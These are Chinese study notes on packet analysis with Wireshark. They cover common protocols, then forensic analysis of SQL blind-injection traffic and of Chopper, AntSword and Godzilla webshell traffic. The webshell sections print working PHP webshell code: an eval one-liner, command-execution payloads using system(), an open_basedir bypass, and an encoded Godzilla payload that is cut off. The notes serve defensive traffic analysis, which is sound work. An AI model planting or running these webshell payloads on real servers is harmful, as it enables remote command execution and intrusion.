<h2 id="FASZw">数据包</h2>
一行叫包，TCP整个通信过程叫流，包括tcp的三次握手，四次挥手，基于tcp连接的上层协议例如http等数据包的合集。



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734674838544-57b5307e-62a6-4f7a-ad11-c5f14022ad77.png)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734674861913-f7cf1360-d4fc-408e-9d12-b7a7543118a7.png)



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734674960955-266641ef-4671-46ca-9946-3098646a5d5e.png)





<h2 id="xSiif">pcap文件修复</h2>


损坏的数据包

[https://f00l.de/hacking/pcapfix.php](https://f00l.de/hacking/pcapfix.php)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734675069252-ce7975e5-8754-434c-8c28-c1ad6404a7d2.png)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734675061056-65c252a2-1026-425d-b8c0-4ea5017ccf72.png)



<h2 id="k5EFQ">Wireshark命令行</h2>
tshark

在Linux命令行中，在没有图形化的操作系统中，使用tshark命令捕获网络流量

```plain
tshark -i <接口名>
tshark -i <接口名> -w <文件名>
```

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734675272485-412c7404-2b05-4449-a4fa-243d78748422.png)

监听eth0网卡

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734675705763-7bfee006-0dcb-49ad-89f1-39293e527219.png)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734675873622-24ee5430-1633-4316-9f3d-5ac5b7b19c19.png)

分析

```plain
tshark -r nmap.pcap
```



<h2 id="mNePH"><font style="color:rgb(0, 0, 0);">SMTP</font></h2>
SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用SSL时端口号为25，启用SSL时端口号多为465或994。



<font style="color:rgb(0, 0, 0);">1、响应代码220表示连接建立成功，后面的Anti-spam是一种用于过滤和阻止垃圾邮件的技术</font>

<font style="color:rgb(0, 0, 0);">2、服务端返回220代码之后，客户端继续发送请求，发送EHLO或者是HELO命令来声明身份，EHLO要更加安全</font>

<font style="color:rgb(0, 0, 0);">3、服务端接收到客户端的EHLO请求之后，返回了一个250代码并且附带了支持的身份验证方式，客户端使用AUTH命令进行身份验证，身份验证成功后会返回235的成功代码</font>

<font style="color:rgb(0, 0, 0);">4、客户端</font>`<font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">MAIL FROM</font>`<font style="color:rgb(0, 0, 0);">命令声明邮件的发件人，</font>`<font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);">RCPT TO</font>`<font style="color:rgb(0, 0, 0);">命令声明邮件的收件人，服务器返回250代码确定操作成功</font>

<font style="color:rgb(0, 0, 0);">5、客户端使用DATA命令，告知服务器要开始传输邮件的正文内容，服务端返回354代码，告知邮件的内容结束以</font>`<font style="color:rgb(192, 52, 29);background-color:rgb(251, 229, 225);"><CR><LF>.<CR><LF></font>`<font style="color:rgb(0, 0, 0);">为标记，客户端接收到354代码后，开始传输邮件内容</font>

<font style="color:rgb(0, 0, 0);">6、客户端发送完邮件内容之后，还会接着发送一个QUIT命令来表示结束这次的SMTP传输，服务器在接受到数据之后会返回250代码表示接受成功并且再返回221代码表示结束本次SMTP传输。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734676500017-deaf0591-54c0-44bb-9f98-57e3f553b30f.png)

<font style="color:rgb(0, 0, 0);">一个简单的smtp协议通信过程</font>

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734676202868-abeac2af-d880-4237-ae2b-f59769cc175b.png)

首先进行tcp连接

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734676260966-91d52f50-59bc-4293-b1c9-3e5f7f37d2cc.png)



这个包是一个 SMTP 协议初始化响应，表示邮件客户端正在与网易企业邮件服务器建立连接，服务器回应了状态码 220，表明连接已经成功建立，接下来可以进行进一步的邮件传输操作。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677302040-c3c2a1ca-37fa-4a4b-af3e-e4109aca665d.png)

建立会话

客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；服务器端正希望以OK作为响应，表明准备接收，这个数据包回复了一个TCP的ACK包表示接收到，并回复给客户端一些服务端支持的SMTP拓展



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677549525-6b2f3986-b0a4-40c7-9c7a-654f2d3172fd.png)

+ **PIPELINING**:  
允许客户端在发送下一个命令之前，不必等待服务器对当前命令的响应，从而提高通信效率。
+ **SIZE 71680000**:  
服务器允许的最大邮件大小为 71,680,000 字节（大约 68.3 MB）。
+ **ETRN**:  
允许客户端请求延迟投递的邮件（通常用于队列中的邮件）。
+ **STARTTLS**:  
支持使用 TLS（传输层安全协议）加密来保护 SMTP 连接的安全性。
+ **AUTH LOGIN PLAIN**:  
支持两种身份验证机制：`LOGIN` 和 `PLAIN`。
+ **LOGIN**: 用户名和密码以 Base64 编码方式传输。
+ **PLAIN**: 用户名和密码以未加密的文本形式传输。
+ **AUTH=LOGIN PLAIN**:  
明确支持 `LOGIN` 和 `PLAIN` 身份验证方式。
+ **ENHANCEDSTATUSCODES**:  
支持增强型状态代码，用于更详细地描述 SMTP 响应状态。
+ **8BITMIME**:  
支持 8 位字符编码的 MIME 邮件，可以更高效地传输包含非 ASCII 字符的邮件内容。



身份认证

第8个数据包标志着 SMTP 客户端和服务器之间身份验证的开始，客户端通过 `AUTH LOGIN` 命令向服务器请求进行用户名/密码验证。

**AUTH LOGIN**:

+ 这是 SMTP 中用于启动身份验证的命令之一。
+ 表示客户端希望通过 **LOGIN 方式** 进行身份验证。
+ **LOGIN 验证方式**:
    - 客户端需要以 Base64 编码的形式提供用户名和密码。
    - 服务端会响应一个提示，要求客户端发送编码后的用户名和密码。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677695323-4604dea5-2557-4423-b5de-f7c54b5a5616.png)



第9个包的内容是VXNlcm5hbWU6，通过base64解码，得到Username:，表示此数据包是 SMTP 协议身份验证过程中的第二步，服务器提示客户端发送用户名。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677774766-9414bc92-67bd-4d0d-835f-0a30ae60849b.png)



然后客户端发送账户名

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677840784-6efab811-0faa-44a0-b439-dcc38858d3bd.png)

第11个包，服务端向客户端索要密码，第12个包客户端发送密码

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677961008-99bc4dec-d9e8-464a-9465-8ee7c84021d4.png)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734677988949-ac24bf86-e6a5-4b77-8c1a-7222b4cf2b35.png)

最后明确表示客户端通过了 SMTP 服务器的身份验证。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1734678022303-fded729b-d8b7-4d76-9d04-d284af48c3bc.png)







<h2 id="v3HFV">FTP</h2>
与 FTP 协议相比，SFTP 在客户端与服务器间提供了一种更为安全的文件传输方式

TFTP协议不需要验证客户端的权限，FTP需要进行客户端验证

FTP-DATA：在服务器和客户端之间传输文件数据的数据连接

FTP(File Transfer Protocol)：文件传输协议，端口：TCP20,21

主动模式：服务端发起数据连接。客户端使用随机端口连接，服务器主动向客户端的随机端口进行连接

被动模式：客户端发起数据连接。 客户端和服务端都是随机端口，客户端向服务器的随机端口进行连接，服务器被动连接

  


`Response code: 220`，意思是FTP返回码220，FTP服务做好了用户登录的准备

客户端发送USER 用户名，服务器返回331状态码，要求用户传送密码，PASS 密码，最后服务器返回230状态码登录成功



服务端

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735107559088-8e329c04-194c-4e01-9df5-14d90540067b.png)

发送用户名

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735107603521-b5557c15-b125-4507-8380-ec5347754224.png)

服务端要求发送密码

客户端发送密码

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735107682261-db45bde1-107e-4df8-be03-a3d37257e25a.png)



服务端返回230，表示登录成功

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735107715804-03cd2706-66a4-4617-8842-4f0e354b37e1.png)

后面就是客户端与服务端交互使用的命令

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735107752685-14541437-3133-477e-9e95-c459d2072428.png)





<h2 id="qum0o"></h2>
<h2 id="uWiFR">DNS</h2>
DNS(domain name system)域名系统，端口：udp53

一条代表一条查询记录

代表128向2发起了DNS查询记录

查询的记录类型是 A（Address），即查询 i6ov08.dnslog.cn 的 IPv4 地址。



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735110120137-8b1d0f31-a0b6-4807-be1e-49a17686362c.png)



<h2 id="eQSDj">Telnet</h2>
[https://cqnswp.blog.csdn.net/article/details/104360182](https://cqnswp.blog.csdn.net/article/details/104360182?fromshare=blogdetail&sharetype=blogdetail&sharerId=104360182&sharerefer=PC&sharesource=qq_38626043&sharefrom=from_link)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735112787178-96708a33-e596-444e-8a65-c3e99cca097f.png)



<h2 id="ssh"><font style="color:rgb(0, 0, 0);">SSH</font></h2>
SSH 和 telnet 之间的主要区别在于 SSH 提供完全加密和经过身份验证的会话。而telnet缺少安全的认证方式，而且传输过程采用TCP进行明文传输

[https://cqnswp.blog.csdn.net/article/details/104359221](https://cqnswp.blog.csdn.net/article/details/104359221?fromshare=blogdetail&sharetype=blogdetail&sharerId=104359221&sharerefer=PC&sharesource=qq_38626043&sharefrom=from_link)



Client: Protocol (SSH-2.0-OpenSSH_for_Windows_9.5)

Server: Protocol (SSH-2.0-OpenSSH_9.9p1 Debian-3)

+ 客户端，服务端分别声明自己的协议版本信息

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735111641546-7ff7d170-f509-4b72-b46d-84f9033fa16a.png)

Client: Key Exchange Init

Server: Key Exchange Init

客户端、服务端发送此消息，列出了支持的密钥交换算法、加密算法、MAC 算法、压缩算法等。

1. 密钥交换：包括 `diffie-hellman-group14-sha256`、`curve25519-sha256` 等常见算法。
2. 加密算法：如 aes256-ctr、aes128-ctr 等，用于对称加密数据传输， 客户端和服务器会从中选择一个双方都支持的加密算法。
3. MAC 算法：用于消息完整性校验，常见算法如 hmac-sha2-256、hmac-sha2-512。
4. 压缩算法：通常包括 none（不压缩）和 zlib（压缩）。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735111735550-ea25d011-5d93-4dc5-b205-59feaa601d73.png)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735111882448-6b1b06ca-eaf4-440b-a01e-7f4ce8378a10.png)

Client: Elliptic Curve Diffie-Hellman Key Exchange Init

+ 客户端向服务器发送其 ECDH 公钥，用于协商会话密钥。
+ 此公钥是根据椭圆曲线算法生成的，与服务器的公钥进行计算后，双方将生成相同的对称会话密钥。

Server: Elliptic Curve Diffie-Hellman Key Exchange Reply, New Keys

+ ECDH Key Exchange Reply：
+ 服务器返回其 ECDH 公钥和数字签名。
+ 此消息还包括服务器使用的主机密钥，用于验证服务器身份。
+ New Keys：
+ 服务器指示切换到新的加密密钥，标志着加密通信阶段的开始。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735112164337-3ed37b6a-76d3-4324-bb6b-3fa981db4fd3.png)

这是 SSH 握手流程的最后一步，标志着密钥交换成功并切换到加密通信。

Client: New Keys

New Keys：

+ 客户端通知服务器切换到新的加密密钥。
+ 从此刻开始，双方的通信将使用协商生成的对称密钥和加密算法。

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735112376705-df28138b-e94b-4eea-8c0d-c41f8dfd7c45.png)



<h2 id="jLf5j"><font style="color:rgb(0, 0, 0);">HTTP/HTTPS</font></h2>
TCP的上层协议

tcp握手后便是http流量，采用明文传输

http

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735108286445-f1d4bfbe-bf23-4fe7-bf63-16eff785d9ec.png)

https

HTTPS使用了SSL/TLS协议，SSL是 TLS 的前身，TLSv1.2则是1.2版本，保证信息安全的要素

<h3 id="bOEDA">TLSv1.2协议</h3>
首先明确TLS的作用三个作用  
（1）身份认证  
通过证书认证来确认对方的身份，防止中间人攻击  
（2）数据私密性  
使用对称性密钥加密传输的数据，由于密钥只有客户端/服务端有，其他人无法窥探。  
（3）数据完整性  
使用摘要算法对报文进行计算，收到消息后校验该值防止数据被篡改或丢失。

[https://blog.csdn.net/wteruiycbqqvwt/article/details/90764611](https://blog.csdn.net/wteruiycbqqvwt/article/details/90764611)

其中，1——4步为握手，5以后为使用握手交换的密钥生成的加密数据

1. **<font style="color:#DF2A3F;">C->S Clinet Hello</font>**
2. **<font style="color:#DF2A3F;">S->C Server Hello, Certificate, Server Key Exchange, Server Hello Done</font>**
    1. Server Hello：服务器向客户端发送用于协商协议版本、加密套件、会话 ID 等的信息。
    2. Certificate：服务器发送自己的证书，通常是 X.509 格式。
    3. Server Key Exchange：服务器发送与密钥交换有关的数据，例如 Diffie-Hellman 参数。
    4. Server Hello Done：服务器通知客户端，Server Hello 阶段完成，等待客户端的响应。
3. **<font style="color:#DF2A3F;">C->S Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message</font>**
    1. Client Key Exchange：客户端发送自己的密钥交换数据（如 Diffie-Hellman 公钥或 RSA 加密的预主密钥），用于协商会话密钥。
    2. Change Cipher Spec：客户端向服务器发送一条通知，表示接下来将切换到加密通信模式。
    3. Encrypted Handshake Message：客户端发送加密的握手消息（通常是 Finished 消息），用于验证握手的完整性。
4. **<font style="color:#DF2A3F;">S->C Client Key Exchange, Change Cipher Spec, Encrypted Handshake Message</font>**
    1. Client Key Exchange：客户端发送密钥交换消息，用于完成对称密钥的协商：例如，在 RSA 密钥交换中，包含使用服务器公钥加密的预主密钥。在 ECDHE 或 DHE 密钥交换中，包含客户端的公钥参数（如椭圆曲线点或 DH 公钥）。
    2. Change Cipher Spec：客户端通知服务器，接下来的通信将切换到加密模式。
    3. Encrypted Handshake Message：客户端发送加密的 `Finished` 消息，包含对握手完整性的校验（通过之前协商的会话密钥生成 MAC）。
5. <font style="color:#DF2A3F;">C<->S Application Data</font>

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735109452767-6fa31470-b305-419c-98dc-96537373c694.png)

获取加密后的数据需要sslkey文件



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735109560089-4461eaea-ded2-4080-baba-ee0aca522bca.png)



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735109661896-8a730213-27cb-4f38-843c-ff05e99e4d76.png)

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735109834056-57cc4c36-afe8-4938-b641-ab9a2a765cb4.png)



<h3 id="SiGje">Webshell 菜刀</h3>














<h3 id="Zg0sn">SQL盲注数据包</h3>
通过数据包可以很直观的看到存在sql注入的数据包



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735113034662-e38ce12f-bd1a-463f-8894-e9f9b9924168.png)

如何快速有效分析

sql盲注：通过sqlmap等工具批量进行尝试猜值，请求包对比t数据库flag表值中的第一个字符，完整的函数逻辑是ascii(substr((select flag from t),1,1))=33，使用select查询t库flag表，select提取到后给substr，substr提取从第1个字符开始提取1个字符，然后给ascii编码为ascii码，最后进行对比。



攻击者角度：返回包，查看包大小，盲注通过返回包大小判断是否猜正确

分析者角度：请求包，请求包中有大量脏数据，无效数据，只能证明攻击者的攻击行为，不能明确攻击者拿到的数据，通过返回包可以获取到攻击者在什么时间，第几个包获取到了他想要的数据



通过对比发现，有一小段的数据包大小跟大部分数据包大小不一样，因为盲注需要大量数据进行猜测，所以少部分数据包为取到的数据的返回包（向前推一位就能获取到攻击者使用的攻击命令）

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735118015985-d9a6e7d4-7636-4b7f-9dd9-3888810bc40f.png)



使用wireshark导出快速获取攻击者获取的数据



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735113375320-a199aac7-b85b-489c-b673-1d04fec3812d.png)

导出

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735113400995-72fe2951-aa76-48e0-9a5a-78104983afeb.png)

url解码

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735113451887-913525c6-fe39-4315-86f7-8a4701b4940f.png)

在第71，72行攻击者数据包发生了变化，表示攻击者猜到flag表的第一个值

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735117487355-2af4ace3-0b46-474d-a356-53d8725e2fae.png)

所以，攻击者得到的第一个字符是f



![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735117620763-9b46516c-ea51-49a6-b107-97bb386fecab.png)



使用代码快速得到相关数据

![](https://cdn.nlark.com/yuque/0/2024/png/27875807/1735118610271-71be4e7d-a9ac-4b1a-979a-43c2b3a10b39.png)

```python
import re
# 通过正则取第一个字符和猜的字符
s = r"from%20t\),([0-9]*),1\)\)=([0-9]*)"
# 把正则语句和正则函数赋值给pat
pat = re.compile(s)
# 打开数据包文件
f = open("timu.pcapng","rb")
# 使用read函数进行读取，并解码为utf-8，并忽略报错
st = f.read().decode("utf-8","ignore")
# 将读取的数据包进行正则匹配，赋值给lis
lis = pat.findall(st)
# 创建一个flag列表接收数据
flag = ['' for i in range(1000)]
# 循环读取正则取出来的值
for t in lis:
    flag[int(t[0])] = chr(int(t[1]))

# 不换行输出
for i in flag:
    print(i,end="")

```

[https://github.com/5ime/SQLBlind_Tools](https://github.com/5ime/SQLBlind_Tools)



<h3 id="NF16A">Webshell 菜刀 PHP</h3>
数据包协议较多

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737618651769-c1dbbdd4-04ff-4c99-9974-87d4f692c1ad.png)

将http协议单独剥离出来分析

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737618724570-cc688c5b-7349-4d30-b4a5-5c624ca1b50e.png)

跟普通的http包一样，webshell分post和get两种方法，此为post方法，下面为post传参

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737619611322-fd8d4927-ee2d-4d0d-93d0-2030fa59f1ca.png)



两个表单项

```plain
@eval\001(base64_decode($_POST[action]));
```

 是一个普通的phpwebshell，webshell密码为action



action 参数，这两段是一个值，由于数据包截断或显示限制导致的差异，一般下面为完整数据流，上面为部分

action为键，后面的base64为值

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737622707276-cbc5a302-df23-4be9-b33d-3e7ef270aa6c.png)



![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737619931553-057675c1-b550-4893-b3de-7c92e8c33cef.png)

使用base64解码得到明文

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737620030943-7d93494b-15c3-435d-af9b-36e77954f931.png)



调整字节流

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737622488980-3a26843c-4f3c-4562-ba05-c4a1cae73a1c.png)



![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737623440362-0a0af0a8-7c32-4d5e-b49a-0463259358c8.png)

最终得到传参，我们添加注释，发现这是一个初始化的传参

```php
<?php
// 禁止显示错误信息
@ini_set("display_errors", "0");

// 取消脚本执行的时间限制
@set_time_limit(0);

// 禁用魔术引号运行时（PHP 5.4 已弃用，PHP 7.0 已移除）
@set_magic_quotes_runtime(0);

// 输出起始标记
echo("->|");

// 获取当前脚本所在的目录
$D = dirname($_SERVER["SCRIPT_FILENAME"]);

// 如果目录为空，尝试使用 PATH_TRANSLATED 获取目录
if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);

// 初始化结果字符串，包含当前目录
$R = "{$D}\t";

// 如果目录不是以 / 开头（即非 Unix 系统，如 Windows）
if (substr($D, 0, 1) != "/") {
    // 遍历盘符 A 到 Z
    foreach (range("A", "Z") as $L) {
        // 检查盘符是否存在（如 C:）
        if (is_dir("{$L}:")) {
            // 将存在的盘符追加到结果字符串
            $R .= "{$L}:";
        }
    }
}

// 追加一个制表符
$R .= "\t";

// 尝试获取当前用户信息（适用于 Unix 系统）
$u = (function_exists('posix_getegid')) ? @posix_getpwuid(@posix_geteuid()) : '';

// 如果获取到用户信息，提取用户名；否则使用 get_current_user()
$usr = ($u) ? $u['name'] : @get_current_user();

// 追加系统信息（操作系统类型、主机名等）
$R .= php_uname();

// 追加当前用户名
$R .= "({$usr})";

// 打印结果字符串
print $R;

// 输出结束标记
echo("|<-");

// 终止脚本执行
die();
?>
```

通过字节流也可以更直观的分析，我们可以通过返回包推测请求包所执行的命令，进行的操作。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737623048177-6134f21b-a825-48da-8200-4dfa55f18d9e.png)



解码z1，z2并执行

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$p = base64_decode($_POST["z1"]);
$s = base64_decode($_POST["z2"]);
$d = dirname($_SERVER["SCRIPT_FILENAME"]);
$c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
$r = "{$p} {$c}";
@system($r . " 2>&1", $ret);
print ($ret != 0) ? "\nret={$ret}\n" : "";
echo("|<-");
die();
```

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737623857290-10b3cae6-8c69-42b1-8af8-ef1a11742cec.png)

总结

特征1：POST数据包中有一句话木马，请求键中带有密码，比如"action"

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737624091649-b3c3a9c7-6e9f-4b69-ba75-34bcdcd0f3e0.png)

特征2：POST数据值为base64编码

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737624220729-974ca732-213c-49b8-97a8-a0b059f3bb4a.png)

特征3：动态的命令执行通过解码 z1 和 z2 参数传递 Base64 编码的命令，动态执行系统命令（如 cd、ls、cat 等），其中z1一般为bash，z2为命令

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737624283151-5356246d-ae09-4f8c-9e22-33b87ea02664.png)

特征4：菜刀在执行的命令都会带上终端目录，也就是默认会只是pwd命令

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1737624328440-58033941-5bf9-4f77-bd69-f6e14fa01850.png)







<h3 id="E0ycq">Webshell 蚁剑 PHP 默认编码</h3>
默认编码的php webshell没有经过base64编码，通过url解码即可看到传参，菜刀升级版。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739155109628-7ac51a9e-374b-4e5f-b1fb-3c41bc5d9e83.png)

蚁剑测试连接

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739155379225-6dc3a848-1140-46b4-9e68-2aa382f76b0e.png)

对应数据包，该操作执行了：获取操作系统类型、目录、获取当前系统用户信息然后将这些信息格式化输出  

```php
// 禁用错误显示和设置最大执行时间为无限
@ini_set("display_errors", "0");
@set_time_limit(0);

// 获取当前PHP环境中的open_basedir设置
$opdir = @ini_get("open_basedir");

if ($opdir) {
    // 获取当前脚本所在的目录，并将其与 open_basedir 进行分割处理
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());

    foreach ($oparr as $item) {
        // 检查目录是否可写，如果可写则创建目录
        if (!@is_writable($item)) {
            continue;
        }
        
        $tmdir = $item . "/.98848";
        @mkdir($tmdir);
        
        // 如果目录创建成功，继续后续操作
        if (!@file_exists($tmdir)) {
            continue;
        }
        
        $tmdir = realpath($tmdir);
        @chdir($tmdir);
        @ini_set("open_basedir", "..");

        // 通过遍历目录路径向上移动，绕过 open_basedir 限制
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        }

        // 恢复 open_basedir 为根目录并删除刚创建的目录
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    }
}

// 空的加密函数，仅返回输入参数
function asenc($out) {
    return $out;
}

// 输出捕获内容并进行封装
function asoutput() {
    // 获取当前输出缓冲区内容
    $output = ob_get_contents();
    ob_end_clean();
    // 输出加密结果（不过这里实际上是原样输出）
    echo "16b" . "5e4";
    echo @asenc($output);
    echo "617" . "c1e";
}

// 启动输出缓冲
ob_start();

// 尝试捕获和输出服务器的一些环境信息
try {
    // 获取当前脚本路径
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    
    // 格式化路径
    $R = "{$D}\t";
    if (substr($D, 0, 1) != "/") {
        // 如果是Windows系统，检查C-Z盘符
        foreach (range("C", "Z") as $L) {
            if (is_dir("{$L}:")) $R .= "{$L}:";
        }
    } else {
        $R .= "/";
    }
    
    $R .= "\t";
    
    // 获取当前用户信息
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    
    // 获取系统信息并输出
    $R .= php_uname();
    $R .= "  {$s}";
    echo $R;
} catch (Exception $e) {
    // 如果发生异常，输出错误信息
    echo "ERROR://".$e->getMessage();
}

// 执行输出操作
asoutput();
die();

```

服务端回显了当前目录，主机名，系统版本，时间和当前用户权限，此为webshell管理器获取的基础数据，用于验证webshell是否有效

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739155657726-2f49dddb-f238-4248-a6f0-de34b654d1bf.png)

蚁剑在正常使用的时候会生成多个参数与服务器进项交互，其中有一些参数可能是无意义的，除初始化操作的值，其它值是通过base64编码的

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739156388848-15a551f0-9883-4f81-a020-bc11080b36c7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739156509498-b607b35c-2b68-4c4d-954a-030572b22251.png)

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739156689286-91d3a487-9912-4893-ac19-41a2caabc261.png)

在执行命令时，蚁剑会生成随机参数名，参数值通过base64编码传入，在执行都会传出执行的bash，然后回到webshell所在目录，执行命令ls 两个echo，其中ls为执行的命令

```php
lf7a6b502b267b参数值
RXL2Jpbi9zaA==
解码为/bin/sh

参数pwd
蚁剑初始化操作

wf4ff3c2d2bf66参数值
cd "/var/www/html";ls;echo 443fcf003;pwd;echo 25b184679 ··
```



总结：

特征1：

蚁剑在使用时，会有初始化操作，其中传入的参数中，一部分php函数固定，比如：@ini_set("display_errors","0");

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739158305020-83764701-098e-429f-8a45-65fded4fb027.png)

特征2：请求体固定格式，参数随机名，值通过base64编码，webshell初始化的参数与值没有通过base64编码

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739158458886-c3960eec-c1b4-4950-a22b-52adc84a433e.png)





<h2 id="EWos8">哥斯拉</h2>
v4.0.1-godzilla

<h3 id="IGl0Q">Webshell Godzilla PHP（php_eval_xor_base64）</h3>
与蚁剑的流量相似，首先，客户端会请求服务端，参数是key与pass，分别对应哥斯拉的密码与密钥，哥斯拉的数据包都是加密的，php_eval_xor_base64的webshell是一句话马，一句话的密码就是哥斯拉的密码，密钥可以随机。

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739167944073-01c0a1d7-09f8-4cef-8f20-4b138be7d13c.png)

第一个http包

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739167890497-6534078b-f4c4-4861-b391-9d285d82df7b.png)

经过分析对比请求包，发现哥斯拉的请求参数pass的值是固定的，每个包都有

![](https://cdn.nlark.com/yuque/0/2025/png/27875807/1739170255836-912346d9-ea07-4dd4-8f54-6f107ffae949.png)

将pass的值取出来格式化分析，哥斯拉进行了url解码、字符串反转、base64解码得到的明文组后交给php执行。

```php
<?php
// 解码并执行经过多次编码的字符串
eval(
    base64_decode( // Base64 解码
        strrev( // 字符串反转
            urldecode( // URL 解码
                'K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wO